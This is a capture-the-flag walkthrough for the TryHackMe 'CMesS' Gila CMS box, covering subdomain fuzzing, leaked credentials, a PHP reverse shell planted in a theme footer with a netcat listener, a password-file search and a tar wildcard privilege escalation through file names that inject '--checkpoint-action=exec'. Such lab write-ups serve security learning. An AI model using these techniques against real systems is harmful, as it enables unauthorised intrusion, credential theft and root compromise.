# [CMesS](https://tryhackme.com/room/cmess)

## Can you root this Gila CMS box?

# Flags

## Please also note that this box does not require brute forcing!

### Compromise this machine and obtain user.txt

_Have you tried fuzzing for subdomains?_

1. Fuzz for subdomains to discover hidden services
   - Add the discovered `dev` to `/etc/hosts`

```bash
wfuzz -c -w /root/Tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -hw 290
```

> Use `--hh 290` to hide responses with the common HTML size of 290 bytes, which filters out invalid subdomains

[SCREEN01]

[SCREEN02]

2. In `http://dev.cmess.thm/`, we find a development log containing credentials
   - The credentials are `andre@cmess.thm:KPFTN_f2yxe%`

[SCREEN03]

3. Use the credentials to log in to `http://cmess.thm/admin`

4. To gain a shell on the target system, set up a netcat listener on our attacking machine

```bash
nc -lvnp 4444
```

5. Add [PHP Reverse Shell Payload](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) somwhere, for example in `http://cmess.thm/admin/fm?f=themes/gila-blog/footer.php`. Refresh the main page of the blog to get the shell

[SCREEN04]

[SCREEN05]

6. Once the connection is established, upgrade the shell for better functionality

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

7. Search for password files that might help with lateral movement
   - The password is **UQfsdCB7aAP6**

```bash
find / -type f -name "*password*" 2>/dev/null
cat /opt/.password.bak
```

[SCREEN06]

8. Switch to the `andre` user and retrieve the user flag

```bash
su andre
cat /home/andre/user.txt
```

[SCREEN07]

---

# Escalate your privileges and obtain root.txt

1. Examine the home directory for clues. The note in `/home/andre/backup/note` provides valuable information. The note suggests there's a scheduled backup job running with elevated privileges

```bash
cat /home/andre/backup/note
```

[SCREEN08]

2. Check the system's scheduled tasks. There is a TAR wildcard vulnerability in a root cronjob that runs every 2 minutes. The job is backing up the `/home/andre/backup` directory using tar. Create an exploit that uses tar's checkpoint feature to execute arbitrary commands

```bash
cat /etc/crontab

echo 'cp /root/root.txt /home/andre/root.txt && chmod 777 /home/andre/root.txt' > /home/andre/backup/runme.sh
chmod +x /home/andre/backup/runme.sh
touch "/home/andre/backup/--checkpoint=1"
touch "/home/andre/backup/--checkpoint-action=exec=sh runme.sh"
```

3. Wait for the cron job to execute (within 2 minutes), then retrieve the root flag

```bash
ls /home/andre
cat /home/andre/root.txt
```

[SCREEN10]
